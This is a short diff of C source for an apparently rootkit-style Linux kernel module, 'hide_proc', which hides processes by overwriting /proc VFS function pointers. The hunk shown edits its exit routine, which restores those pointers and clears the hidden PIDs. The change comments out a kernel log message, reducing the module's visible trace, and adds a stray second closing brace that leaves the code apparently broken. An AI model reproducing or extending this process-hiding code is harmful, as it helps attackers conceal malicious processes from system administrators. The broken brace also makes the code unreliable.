@@ -230,10 +230,11 @@ int hide_proc_init(void) {
 }
 
 void hide_proc_exit(void) {
-    printk(KERN_INFO "[hide_proc] Exiting process hiding (restoring VFS pointers)\n");
+    // printk(KERN_INFO "[hide_proc] Exiting process hiding (restoring VFS pointers)\n");
 
     if (proc_root_fops && original_proc_root_readdir) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
+
         remap_write_range(&proc_root_fops->iterate_shared, &original_proc_root_readdir, sizeof(void *), true);
 #else
         remap_write_range(&proc_root_fops->readdir, &original_proc_root_readdir, sizeof(void *), true);
@@ -246,4 +247,5 @@ void hide_proc_exit(void) {
 
     clear_hidden_pids();
     printk(KERN_INFO "[hide_proc] Restored /proc operations.\n");
+}
 }
